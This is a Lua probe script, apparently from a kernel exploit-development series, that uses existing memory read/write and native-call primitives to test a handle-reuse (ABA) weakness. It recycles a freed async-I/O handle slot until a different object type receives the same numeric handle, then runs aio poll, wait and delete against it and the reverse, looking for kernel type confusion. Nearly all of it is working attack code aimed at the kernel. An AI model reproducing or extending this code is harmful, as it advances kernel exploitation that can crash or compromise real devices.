-- CRASH_CLASS: MODERATE
-- PROBE 96c: cross-family handle ABA - aio id and 557 handle on one slot
--
-- 96b showed the handle generation is three bits (period 8) and the number is
-- slot | gen<<13. AIO ids use the same encoding in the same low slots
-- (the submit in 894a handed out 0x4205, slot 0x205). So one slot can hold an
-- aio object and then a generic 557 object with the same numeric handle.
--
-- If the aio handlers (662 delete, 664 poll) check only the number, a stale aio
-- id would operate on a 557 object - kernel type confusion. If they check the
-- object's type, they refuse it. This measures which.
--
-- Section A: create one aio object, record slot and generation, delete it.
-- Section B: cycle 557 objects on the freed slot until the handle equals the
--            aio id, keeping the 557 object live.
-- Section C: call aio operations with the numeric id of the live 557 object.
-- Section D: the reverse - delete a live aio object through 558.
-- Section E: verify the state afterwards with fresh objects.

print("=== PROBE 96c: cross-family handle ABA ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return -1 end
local function wr(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(f,...) local ok,rv=pcall(f,...) if not ok then return -999 end return to_num(rv) end
local function pid() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end
local function alive(tag) local p=pid() print("  alive="..tostring(p).." ("..tag..")") if p==0 then error("process died",0) end return p end

local submit = mk(669)
local adele  = mk(662)
local apoll  = mk(664)
local await  = mk(663)
local create = mk(557)
local del    = mk(558)

local reqs = memory.alloc(0x28); zero(reqs, 0x28)
local ids  = memory.alloc(0x10); zero(ids, 0x10)
local st   = memory.alloc(0x10); zero(st, 0x10)
local er   = memory.alloc(0x10); zero(er, 0x10)
local name = memory.alloc(0x20); zero(name, 0x20)
for i=1,#"aba" do wb(name+i-1, string.byte("aba",i)) end

local function slot(h) return h % 0x2000 end
local function gen(h) return math.floor(h / 0x2000) end

print("[0] pid=" .. tostring(pid()))

print("")
print("--- A: create and delete one aio object ---")
local r = call(submit, uint64(0x1001), uint64(reqs), uint64(1), uint64(3), uint64(ids))
local A = rd(ids)
print(string.format("  submit ret=%d id=0x%X slot=0x%X gen=%d", r, A, slot(A), gen(A)))
print("  delete ret=" .. call(adele, uint64(ids), uint64(1), uint64(er)))
alive("after aio delete")
if A <= 0 then print("[!] no id, stopping"); return end

print("")
print("--- B: put a 557 object on that slot with the same generation ---")
-- the allocator hands out the lowest free slot, and slot 0x205 was free, so it
-- takes keepers until the target slot comes up
local keepers = {}
local target = slot(A)
local match = nil
for i = 1, 20 do
    local h = call(create, uint64(name), uint64(0), uint64(0), uint64(0))
    if h <= 0 then print("  create failed at " .. i); break end
    if slot(h) < target then
        keepers[#keepers + 1] = h
        print(string.format("  keeper  handle=0x%X slot=0x%X gen=%d", h, slot(h), gen(h)))
    elseif slot(h) == target then
        print(string.format("  %2d handle=0x%X slot=0x%X gen=%d%s", i, h, slot(h), gen(h),
            (h == A) and "  <== equals the aio id" or ""))
        if h == A then match = h break end
        call(del, uint64(h))
    else
        print(string.format("  skipped slot 0x%X (above the target)", slot(h)))
        call(del, uint64(h))
    end
end
if match == nil then
    print("  no generation match in 12 cycles; the slot was not reused")
    alive("no match")
    return
end
alive("557 object live on the aio slot")

print("")
print("--- C: aio operations on a live 557 object ---")
wr(ids, match); wr(ids+4, 0)
zero(st, 0x10); zero(er, 0x10)
r = call(apoll, uint64(ids), uint64(1), uint64(st))
print("  664 poll  ret=" .. r .. " st0=" .. rd(st))
alive("after poll")
r = call(await, uint64(ids), uint64(1), uint64(st), uint64(0))
print("  663 wait  ret=" .. r)
alive("after wait")
r = call(adele, uint64(ids), uint64(1), uint64(er))
print("  662 delete ret=" .. r .. " er0=" .. rd(er))
alive("after aio delete")
local still = call(del, uint64(match))
print("  558 on the same number ret=" .. still .. " (0 means the 557 object was still there and is now gone)")
alive("end of C")

print("")
print("--- D: reverse direction, 558 on a live aio object ---")
zero(ids, 0x10)
r = call(submit, uint64(0x1001), uint64(reqs), uint64(1), uint64(3), uint64(ids))
local B = rd(ids)
print(string.format("  submit ret=%d id=0x%X slot=0x%X gen=%d", r, B, slot(B), gen(B)))
if B > 0 then
    print("  558(id)   ret=" .. call(del, uint64(B)))
    print("  662(ids)  ret=" .. call(adele, uint64(ids), uint64(1), uint64(er)) .. " er0=" .. rd(er))
end
alive("end of D")

print("")
print("--- E: state check ---")
local h = call(create, uint64(name), uint64(0), uint64(0), uint64(0))
print(string.format("  557 create handle=0x%X slot=0x%X gen=%d", h, slot(h), gen(h)))
if h > 0 then print("  558 delete ret=" .. call(del, uint64(h))) end
alive("end of E")

print("=== PROBE 96c COMPLETE ===")
